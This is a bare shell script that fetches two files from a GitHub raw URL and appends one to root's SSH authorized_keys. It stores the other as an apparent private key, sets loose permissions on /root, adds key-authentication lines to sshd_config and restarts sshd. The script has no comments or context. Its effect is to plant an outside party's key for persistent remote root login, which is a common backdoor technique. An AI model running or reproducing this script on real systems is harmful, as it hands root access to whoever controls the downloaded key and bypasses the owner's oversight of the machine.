apt-get update
apt-get -y install wget zip
mkdir /root/.ssh
cd /root/.ssh
wget https://raw.githubusercontent.com/fffgg3g/incodeserver/master/gongmi.gongmi
wget https://raw.githubusercontent.com/fffgg3g/incodeserver/master/readme2.txt
cat gongmi.gongmi >> /root/.ssh/authorized_keys
cat readme2.txt >> /root/.ssh/pr
chmod 755 /root
chmod 755 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/pr
sed -i '$a\AuthorizedKeysFile     /root/.ssh/authorized_keys'  /etc/ssh/sshd_config
sed -i '$a\RSAAuthentication yes'  /etc/ssh/sshd_config
sed -i '$a\PubkeyAuthentication yes'  /etc/ssh/sshd_config
service sshd restart
